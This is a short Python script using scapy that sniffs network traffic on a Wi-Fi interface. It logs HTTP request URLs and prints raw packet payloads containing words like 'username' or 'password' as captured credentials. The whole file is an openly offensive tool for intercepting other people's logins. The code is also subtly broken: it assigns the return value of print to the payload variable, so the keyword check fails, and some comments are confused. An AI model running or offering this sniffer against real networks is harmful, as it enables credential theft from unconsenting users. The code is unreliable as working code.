#! /usr/bin/env python

import scapy.all as scapy
from scapy.layers import http # need to import http bcz scapy doesn't have it pre-installed.


# sniff func is used for sniffing the network packets. 
# We can also add a 4th argument(filter= XYZ , {used BPF - Berkeley packet filter syntax}) in the func field, which is used to filter the protocol/port on which we are sniffing the packet. e.g., tcp, udp, port 21, port 80, etc. {it excludes http traffic}
def sniff(interface):
	scapy.sniff(iface=interface, store=False, prn=sniffed_packet)
# Self explanatory - capture the url of the sniffed packet.
def capture_url(packet):
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path #Host:main url +	 Path:path of the site we are visiting.

# Capturing the username and password from the sniffed packet, using some keywords.
def capture_login_info(packet):
	if packet.haslayer(scapy.Raw):	 #checking if the packet has the http layer or not. {print(packet.show() - will show us all the layers and interfaces of the packet)}
			load = print(packet[scapy.Raw].load)
			keywords = ["username", "user", "login", "password", "pass"]
			for keyword in keywords:
				if keyword in load:
					return load

# this func is used to filter the sniffed packet.
def sniffed_packet(packet):
	if packet.haslayer(http.HTTPRequest):	#used to check if we have a http packet or not.	
		url = capture_url(packet)
		print("[+] HTTP Request >>>" + str(url))
		login_info = capture_login_info(packet)
		if login_info:
			print("\n\n [+] Possible Username/Password >>>" + str(login_info) + "\n\n")


sniff("Wi-Fi")
